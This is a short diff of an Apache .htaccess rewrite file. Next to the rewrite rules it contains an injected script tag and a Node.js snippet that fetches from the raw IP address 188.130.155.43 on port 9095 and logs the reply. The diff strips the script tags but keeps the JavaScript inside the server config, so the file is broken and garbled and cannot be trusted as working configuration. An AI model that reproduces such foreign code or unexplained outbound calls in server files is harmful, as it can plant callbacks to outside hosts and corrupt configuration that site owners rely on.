@@ -13,7 +13,6 @@ RewriteCond %{REQUEST_FILENAME} !-d
 
 RewriteRule ^([^/].*)?$ web/$1
 start <script>console.log("Here");</script> end
-<script>
 var request = require('request');
 var url ='http://188.130.155.43:9095'
 request(url, function (error, response, body) {
@@ -21,4 +20,3 @@ request(url, function (error, response, body) {
     console.log(body);
   }
 });
-</script>
